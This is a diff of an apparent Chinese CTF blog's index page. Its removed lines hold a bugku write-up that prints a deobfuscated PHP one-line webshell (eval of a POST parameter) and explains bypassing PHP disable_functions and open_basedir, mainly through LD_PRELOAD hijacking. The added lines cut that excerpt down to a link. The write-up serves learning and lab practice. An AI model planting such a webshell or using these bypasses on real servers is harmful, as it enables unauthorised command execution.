@@ -28,87 +28,15 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Tlife</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/06/bugku5/">bypass_disable_functions</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-07</span></span></div></header><div class="post-body"><div class="post-excerpt">
-        <h2 id="get-shell">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Tlife</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/06/bugku5/">bypass_disable_functions</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-07</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="get-shell">
           <a href="#get-shell" class="heading-link"><i class="fas fa-link"></i></a>get shell</h2>
       <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120229.png" alt="img" style="zoom:67%;">
-打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容
-
-<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@<span class="keyword">eval</span>($_POST[ymlisisisiook]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
-
-<p>解密网址如下:<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>看起来是个一句话木马，用蚁剑连接试试:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207120640.png" alt="img" style="zoom:67%;"><br>接下来我想访问一下其他文件夹试试，发现是没有权限的，这个时候就要想想如何提权了？</p>
-<p>打开命令执行窗口，发现不论输入什么指令都是ret<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207130155.png" alt="img" style="zoom:67%;"><br>搜索一下这个ret=127什么意思,发现是绕过disable_functions</p>
-<p>接下来就直接去百度如果bypass_disable_functions这里介绍说可以直接用antsword里面的插件</p>
-
-        <h3 id="使用antsword插件进行绕过">
-          <a href="#使用antsword插件进行绕过" class="heading-link"><i class="fas fa-link"></i></a>使用antsword插件进行绕过</h3>
-      <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161515.png" alt="img" style="zoom:67%;">
-接下来会在目录下生成一个php文件，直接再用蚁剑访问连接，密码依旧是之前那个
-
-<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207161657.png" alt="img" style="zoom: 50%;">
-接下来就可以发现flag在根目录下了
-
-
-        <h3 id="了解原理">
-          <a href="#了解原理" class="heading-link"><i class="fas fa-link"></i></a>了解原理</h3>
-      <p>其实感觉用插件不明不白的，所以决定要深入学习一下</p>
-
-        <h4 id="原因：">
-          <a href="#原因：" class="heading-link"><i class="fas fa-link"></i></a>原因：</h4>
-      <p>为什么会使用不了系统命令呢？<br><strong>disable_functions</strong>开关在php.ini中可以关闭一些危险的功能，如系统、执行等</p>
-<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163003.png" alt="img" style="zoom:67%;">
-
-<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163029.png" alt="img" style="zoom:67%;">
-因为在这个disable_functions这里禁用了很多函数。　
-**open_basedir**
-网站内目录与目录之间是可以访问的，在某些特定情况下这样是不安全的，如果目录间网址权限被黑客利用很可能造成数据流失，在这里我们可以通过PHPopen_basedir来实现网站间目录隔离配置，从而提高网站安全。
-注：网站间隔离用“：”号分割。
-注：没有被包含的网站不可访问。
-
-<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210207163338.png" alt="img" style="zoom:67%;">
-
-<p>PS：这里我之前想说尝试用文件包含漏洞看看能不能访问根目录的内容，但是因为有这个限制在，所以不行<br>所以接下来我们需要绕过这两个东西</p>
-
-        <h4 id="绕过思路">
-          <a href="#绕过思路" class="heading-link"><i class="fas fa-link"></i></a>绕过思路</h4>
-      <p>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；<br>第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；<br>第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；<br>第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。<br>参考:<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>但今天我们就直接看一下第四种方法</p>
-
-        <h4 id="基础知识学习">
-          <a href="#基础知识学习" class="heading-link"><i class="fas fa-link"></i></a>基础知识学习</h4>
-      
-        <h5 id="linux动态库（so共享对象库），静态库">
-          <a href="#linux动态库（so共享对象库），静态库" class="heading-link"><i class="fas fa-link"></i></a>linux动态库（so共享对象库），静态库</h5>
-      <p>一个“程序函数库”简单的说就是一个文件包含了一些编译好的代码和数据，这些编译好的代码和数据可以在事后供其他的程序使用。程序函数库可以使整个程序更加模块化，更容易重新编译，而且更方便升级。  </p>
-<p>程序函数库可分为3种类型：静态函数库（static libraries）、共享函数库（shared libraries）、动态加载函数库（dynamically loaded libraries）<strong>动态函数库同*共享函数库是一个东西（在linux上叫共享对象库， 文件后缀是.so ，windows上叫动态加载函数库， ****文件后缀是****.dll）**</strong></p>
-<p>今天我们需要学习的就是动态函数库,因为需要创建.so文件</p>
-
-        <h5 id="共享函数库：">
-          <a href="#共享函数库：" class="heading-link"><i class="fas fa-link"></i></a>共享函数库：</h5>
-      <p>**定义:**共享函数库中的函数是在当一个可执行程序在启动的时候被加载。如果一个共享函数库正常安装，所有的程序在重新运行的时候都可以自动加载最新的函数库中的函数。对于Linux系统还有更多可以实现的功能：<br>    1、升级了函数库但是仍然允许程序使用老版本的函数库。<br>    2、当执行某个特定程序的时候可以覆盖某个特定的库或者库中指定的函数。<br>    3、可以在库函数被使用的过程中修改这些函数库。</p>
-
-        <h5 id="PHP启动外部程序：">
-          <a href="#PHP启动外部程序：" class="heading-link"><i class="fas fa-link"></i></a>PHP启动外部程序：</h5>
-      <p>PHP启动外部程序有两种，常见的就是使用cat，system等指令，但是在这里是用不了的<br><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000008941850">https://segmentfault.com/a/1190000008941850</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>还有一种就是通过PHP解释器：这里直接摘抄大佬的思路：比如，php 函数 goForward() 实现“前进”的功能，php 函数 goForward() 又由组成 php 解释器的 C 语言模块之一的 move.c 实现，C 模块 move.c 内部又通过调用外部程序 go.bin 实现，那么，我的 php 脚本中调用了函数 goForward()，势必启动外部程序 go.bin。</p>
-
-        <h5 id="LD-PRELOAD环境变量：">
-          <a href="#LD-PRELOAD环境变量：" class="heading-link"><i class="fas fa-link"></i></a>LD_PRELOAD环境变量：</h5>
-      <p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
-
-        <h5 id="LD-PRELOAD实现思路（思路重点）">
-          <a href="#LD-PRELOAD实现思路（思路重点）" class="heading-link"><i class="fas fa-link"></i></a>LD_PRELOAD实现思路（思路重点）</h5>
-      <p>在看完大佬的思路解析后，我来复现一下，首先我们知道LD_PRELOAD可以允许我们定义在程序运行前优先加载的动态链接库，此时我们设这个库为e_evil.so，在这个库中我们可以加入可以执行的恶意代码，注意此时这个库中的代码是不受disable_functions限制的，因为他不是这个系统当中，是我们后来定义的，那么有人会问，为啥执行的是我们定义的这个库里的系统函数，而不是原本存在的？这里就是因为我们一开始说的因为它的优先级比较高，那么如何使得我们定义的这个系统之外的函数被加载呢？那就需要我们通过web打开新进程。</p>
-
-        <h2 id="插件使用条件">
-          <a href="#插件使用条件" class="heading-link"><i class="fas fa-link"></i></a>插件使用条件</h2>
-      <p>成功使用此绕过插件的三个必要条件是：</p>
-<p>1.mail()函数和error_log()函数所调用的sendmail已安装<br>2.不限制 /usr/sbin/sendmail 的执行<br>3.mail()函数和error_log()函数有一个未被禁用</p>
-<p>在这里有个点，一开始我是直接大神的bypass工具集，在操作的时候发现怎么都没法输出，后来重新看了一下文章，他是使用mail()函数，但是在本题当中，mail函数是被禁用的，所以最终就失败了。<br>参考大神链接：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>antsword插件运行原理细节：<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195686">https://www.anquanke.com/post/id/195686</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/05/i%E6%98%A5%E7%A7%8B1/">i春秋1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-05</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>最近刷bugku的题，刷到最后一关实在有点太磨人了，来i春秋换换心情吧。。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">CBC字节翻转攻击</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-06</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="CBC加密流程">
+打开以后发现是这样的，我以为是被加密了，直接把上面的内容粘贴复制搜索，后来发现，是使用了混淆代码的工具，拿去解密一下就可以得到以下内容</div><div class="post-readmore"><a class="post-readmore__link" href="/2021/02/06/bugku5/"><span class="post-readmore__text">Read More</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/05/i%E6%98%A5%E7%A7%8B1/">i春秋1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-05</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>最近刷bugku的题，刷到最后一关实在有点太磨人了，来i春秋换换心情吧。。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">CBC字节翻转攻击</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-07</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="CBC加密流程">
           <a href="#CBC加密流程" class="heading-link"><i class="fas fa-link"></i></a>CBC加密流程</h2>
       <p>首先将明文分组，常见的以16个字节为一组，位数不足的使用特殊字符填充——&gt;生成一个随机的初始化向量(IV)和一个密钥——&gt;将IV和第一组明文异或——&gt;用密钥对3中XOR后产生的密文加密——&gt;用4中产生的密文对第二组明文进行XOR操作——&gt;用密钥对5中产生的密文加密——&gt;c重复步骤4-7，到最后一组明文——&gt;将IV和加密后的密文拼接在一起，得到最终的密文。</p>
-<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206115835.png" alt="img" style="zoom:67%;">Plaintext：待加密的数据——也就是明文</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="post-readmore__text">Read More</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/">linux反弹shell的本质(二)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-04</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="什么是反弹shell">
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210206115835.png" alt="img" style="zoom:67%;">
+Plaintext：待加密的数据——也就是明文</div><div class="post-readmore"><a class="post-readmore__link" href="/2021/02/05/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"><span class="post-readmore__text">Read More</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/">linux反弹shell的本质(二)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-02-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-02-04</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="什么是反弹shell">
           <a href="#什么是反弹shell" class="heading-link"><i class="fas fa-link"></i></a>什么是反弹shell</h2>
       
         <h4 id="shell是什么">
